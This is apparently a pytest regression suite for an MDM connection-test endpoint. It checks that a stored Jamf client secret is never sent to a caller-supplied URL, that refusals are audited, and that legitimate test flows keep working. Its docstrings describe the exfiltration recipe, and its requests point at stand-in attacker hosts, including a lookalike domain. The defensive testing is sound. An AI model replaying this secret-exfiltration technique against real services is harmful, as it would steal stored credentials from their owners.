"""POST /api/mdm/connections/test: where the stored Jamf secret is allowed to travel.

The endpoint falls back to the *stored* client secret when the payload omits one —
that is deliberate, and it is why the route sits behind CONNECTION_CREDENTIAL_READ
rather than CONNECTION_WRITE. What was not deliberate is that it also honoured the
payload's `base_url` while doing so: name an existing connection, omit the secret,
point base_url at a host you control, and Jamf's client-credentials POST delivers a
secret the product has no read path for (#132). These tests pin the closed door and,
just as importantly, the three doors that must stay open.

The outbound attempt is observed by replacing `JamfClient.test_connection` with a
recorder over the constructed client. That records the two attributes the real method
puts in the OAuth POST body — `self._base_url` and `self._client_secret`
(`app/mdm/jamf/client.py`, `test_connection`) — so "the secret the endpoint was about
to send, and where" is exactly what each assertion below reads.

Needs a real Postgres: the fallback reads a stored row through the tenant-scoped
session, and the refusal is a comparison against that row. Gated on RUN_DB_TESTS like
the other database-backed suites.
"""

from __future__ import annotations

import json
import logging
import os
import uuid as uuidlib

import httpx
import pytest
import pytest_asyncio
from sqlalchemy import delete, select

pytestmark = [
    pytest.mark.skipif(not os.environ.get("RUN_DB_TESTS"), reason="needs Postgres; set RUN_DB_TESTS=1"),
    pytest.mark.asyncio(loop_scope="session"),
]

STORED_URL = "https://stored.jamfcloud.com"
STORED_SECRET = "stored-client-secret-never-shown"
ATTACKER_URL = "https://listener.attacker.example"

ADMIN = ("connection-test-admin@example.com", "connection-test-admin-password")
AUDITOR = ("connection-test-auditor@example.com", "connection-test-auditor-password")


@pytest_asyncio.fixture(scope="session", loop_scope="session")
async def accounts() -> None:
    from app.core.bootstrap import bootstrap_tenants, create_account
    from app.core.database import init_db, session_for_tenant, unscoped_session
    from app.core.tenancy import OPERATIONAL_TENANT_ID
    from app.models.schema import Account

    await init_db()
    async with unscoped_session() as db:
        await bootstrap_tenants(db)

    async with session_for_tenant(OPERATIONAL_TENANT_ID) as db:
        for (email, password), role in ((ADMIN, "admin"), (AUDITOR, "auditor")):
            # Get-or-create: CI starts from a fresh database, but a developer
            # re-running this locally must not spend the evening on a unique
            # constraint left by the previous pass.
            if (await db.execute(select(Account).where(Account.email == email))).scalars().first() is None:
                await create_account(db, email=email, display_name=role, password=password, roles=(role,))
        await db.commit()


async def _signed_in(email: str, password: str) -> httpx.AsyncClient:
    """An HTTP client signed in as `email`, CSRF header armed.

    Returns an open client rather than a context manager: logging in opens it, and
    httpx refuses to `__aenter__` an already-opened client — a caller that wrapped the
    result in `async with` would see a RuntimeError instead of a test result.
    """
    from app.main import app

    # https, not http: the session cookie is Secure, and a client on a plain-http
    # origin discards it silently — login returns 200 and every request after it 401s.
    client = httpx.AsyncClient(
        transport=httpx.ASGITransport(app=app), base_url="https://connections.example.com"
    )
    response = await client.post("/api/auth/login", json={"email": email, "password": password})
    assert response.status_code == 200, f"login failed: {response.status_code} {response.text}"
    client.headers["X-CSRF-Token"] = client.cookies.get("loon_csrf", "")
    return client


@pytest_asyncio.fixture(loop_scope="session")
async def client(accounts):
    signed_in = await _signed_in(*ADMIN)
    try:
        yield signed_in
    finally:
        await signed_in.aclose()


@pytest_asyncio.fixture(loop_scope="session")
async def db(accounts):
    from app.core.database import session_for_tenant
    from app.core.tenancy import OPERATIONAL_TENANT_ID

    async with session_for_tenant(OPERATIONAL_TENANT_ID) as session:
        yield session


@pytest_asyncio.fixture(loop_scope="session")
async def connection(db):
    """One saved connection holding a secret nothing may read back.

    Function-scoped and deleted afterwards because one of these tests changes the
    connection's URL, and a shared row would make the suite order-dependent.
    """
    from app.models.schema import MdmConnection

    row = MdmConnection(
        name=f"connection-test {uuidlib.uuid4().hex[:8]}",
        provider="jamf",
        base_url=STORED_URL,
        # The canonical (snake_case) keys create_connection writes, which is what the
        # endpoint's fallback looks up.
        credentials_encrypted=json.dumps({"client_id": "stored-client-id", "client_secret": STORED_SECRET}),
    )
    db.add(row)
    await db.commit()
    connection_id = row.id
    try:
        yield row
    finally:
        await db.rollback()
        await db.execute(delete(MdmConnection).where(MdmConnection.id == connection_id))
        await db.commit()


@pytest.fixture
def attempts(monkeypatch: pytest.MonkeyPatch) -> list[dict[str, str]]:
    """Every outbound token exchange the endpoint was about to make."""
    from app.mdm.jamf.client import JamfClient

    recorded: list[dict[str, str]] = []

    async def _record(self: JamfClient) -> dict:
        recorded.append(
            {"base_url": self._base_url, "client_id": self._client_id, "client_secret": self._client_secret}
        )
        return {"expires_in": 1799, "token_type": "Bearer"}

    monkeypatch.setattr(JamfClient, "test_connection", _record)
    return recorded


@pytest.fixture
def audit_records() -> list[dict]:
    """The tenant's audit events, read off the logger rather than the rotated file."""
    from app.core.audit import _audit_logger
    from app.core.tenancy import OPERATIONAL_TENANT_ID

    captured: list[dict] = []

    class _Capture(logging.Handler):
        def emit(self, record: logging.LogRecord) -> None:
            captured.append(json.loads(record.getMessage()))

    # Built first, then appended to: _build_audit_logger *replaces* the handler list,
    # so attaching before the logger exists would lose the handler on first use.
    tenant_logger = _audit_logger(str(OPERATIONAL_TENANT_ID))
    handler = _Capture()
    tenant_logger.addHandler(handler)
    try:
        yield captured
    finally:
        tenant_logger.removeHandler(handler)


def _test_payload(**overrides) -> dict:
    payload = {"provider": "jamf", "baseUrl": STORED_URL, "clientId": "stored-client-id"}
    payload.update(overrides)
    return payload


# --- The exploit, closed --------------------------------------------------------------


async def test_stored_secret_is_refused_against_an_attacker_supplied_base_url(
    client, connection, attempts, audit_records
) -> None:
    """SECURITY: the stored secret must never be sent to a URL the caller chose.

    This is the exfiltration in #132 expressed as a request: an existing connection,
    no secret in the body (so the stored one is used), and a base_url belonging to the
    caller. Before the fix this answered 200/success and posted STORED_SECRET to the
    attacker's /api/oauth/token; the product has no other path that reveals it.
    """
    response = await client.post(
        "/api/mdm/connections/test",
        json=_test_payload(connectionId=connection.id, baseUrl=ATTACKER_URL),
    )

    assert response.status_code == 200
    assert response.json()["success"] is False
    assert "saved URL" in response.json()["message"]
    # The load-bearing assertion: nothing was sent anywhere. Not "sent to the stored
    # URL instead" — the admin is told to save or retype, not quietly redirected.
    assert attempts == []

    refusals = [r for r in audit_records if r["action"] == "connection.tested" and r["outcome"] == "refused"]
    assert len(refusals) == 1, refusals
    # The attempt is evidence: the URL the caller asked for is on the record, the
    # reason says which rule stopped it, and the record carries no secret material.
    #
    # `reason` and not `used_stored_secret`: that flag has read "[REDACTED]" in every
    # connection.tested record since it was added, because redact() matches the
    # substring "secret" in the key name. Asserted on the field that actually survives
    # the redactor, so this test pins detectability rather than a blanked value.
    assert refusals[0]["metadata"]["base_url"] == ATTACKER_URL
    assert refusals[0]["metadata"]["reason"] == "stored_secret_foreign_base_url"
    assert STORED_SECRET not in json.dumps(refusals[0])


async def test_stored_secret_is_refused_for_a_lookalike_host(client, connection, attempts) -> None:
    """SECURITY: refusal is by exact URL, not by "looks like the same tenant"."""
    response = await client.post(
        "/api/mdm/connections/test",
        json=_test_payload(connectionId=connection.id, baseUrl="https://stored.jamfcloud.com.attacker.example"),
    )

    assert response.json()["success"] is False
    assert attempts == []


# --- The three doors that must stay open ----------------------------------------------


async def test_stored_secret_against_the_stored_url_still_works(client, connection, attempts) -> None:
    response = await client.post(
        "/api/mdm/connections/test", json=_test_payload(connectionId=connection.id)
    )

    assert response.json()["success"] is True, response.text
    assert attempts == [
        {"base_url": STORED_URL, "client_id": "stored-client-id", "client_secret": STORED_SECRET}
    ]


async def test_a_trailing_slash_is_not_a_foreign_url(client, connection, attempts) -> None:
    """The one spelling difference JamfClient itself erases must not cost a refusal."""
    response = await client.post(
        "/api/mdm/connections/test",
        json=_test_payload(connectionId=connection.id, baseUrl=f"{STORED_URL}/"),
    )

    assert response.json()["success"] is True, response.text
    assert attempts[0]["base_url"] == STORED_URL


async def test_newly_supplied_credentials_reach_an_arbitrary_url(client, attempts) -> None:
    """The pre-save test: no connection yet, so the caller's own secret and the
    caller's own URL. Nothing stored is at risk, and this is the flow the new-
    connection form depends on."""
    response = await client.post(
        "/api/mdm/connections/test",
        json=_test_payload(baseUrl="https://brand-new.jamfcloud.com", clientSecret="typed-by-the-admin"),
    )

    assert response.json()["success"] is True, response.text
    assert attempts[0]["base_url"] == "https://brand-new.jamfcloud.com"
    assert attempts[0]["client_secret"] == "typed-by-the-admin"


async def test_a_retyped_secret_may_be_tested_against_a_new_url_before_saving(
    client, connection, attempts
) -> None:
    """The distinction the fix turns on: the edit form sends connectionId alongside a
    changed baseUrl. With a secret typed into the form that is a legitimate test of new
    credentials; only the *stored* secret is pinned to the stored URL."""
    response = await client.post(
        "/api/mdm/connections/test",
        json=_test_payload(
            connectionId=connection.id, baseUrl="https://moved.jamfcloud.com", clientSecret="retyped"
        ),
    )

    assert response.json()["success"] is True, response.text
    assert attempts[0]["base_url"] == "https://moved.jamfcloud.com"
    assert attempts[0]["client_secret"] == "retyped"
    assert STORED_SECRET not in json.dumps(attempts)


async def test_the_edit_flow_moves_a_connection_and_can_still_test_it(
    client, db, connection, attempts
) -> None:
    """End to end through the normal admin path: save the new URL, then test. The
    stored secret follows the connection because the connection is what moved.

    The secret is re-typed on the PATCH — the same value the admin already holds —
    because moving a connection now requires proving you hold its secret: on its own,
    CONNECTION_WRITE was the other half of #132 (see test_connection_move_db). It is
    still the *stored* secret that the test below sends, since re-entering it is what
    stored it.
    """
    moved = "https://moved.jamfcloud.com"
    patched = await client.patch(
        f"/api/mdm/connections/{connection.id}",
        json={"baseUrl": moved, "credentials": {"clientSecret": STORED_SECRET}},
    )
    assert patched.status_code == 200, patched.text
    assert patched.json()["baseUrl"] == moved

    response = await client.post(
        "/api/mdm/connections/test", json=_test_payload(connectionId=connection.id, baseUrl=moved)
    )

    assert response.json()["success"] is True, response.text
    assert attempts == [
        {"base_url": moved, "client_id": "stored-client-id", "client_secret": STORED_SECRET}
    ]
    # And the old URL is now the foreign one — the pin follows the row, not a constant.
    await client.post("/api/mdm/connections/test", json=_test_payload(connectionId=connection.id))
    assert len(attempts) == 1


# --- The gate the fallback sits behind ------------------------------------------------


async def test_auditor_cannot_exercise_the_stored_secret_at_all(accounts, connection, attempts) -> None:
    """SECURITY: CONNECTION_CREDENTIAL_READ, not CONNECTION_READ. The read-only admin
    role sees the connection and never touches its live secret."""
    auditor = await _signed_in(*AUDITOR)
    try:
        assert (await auditor.get(f"/api/mdm/connections/{connection.id}")).status_code == 200
        refused = await auditor.post(
            "/api/mdm/connections/test", json=_test_payload(connectionId=connection.id)
        )
    finally:
        await auditor.aclose()

    assert refused.status_code == 403, refused.text
    assert attempts == []
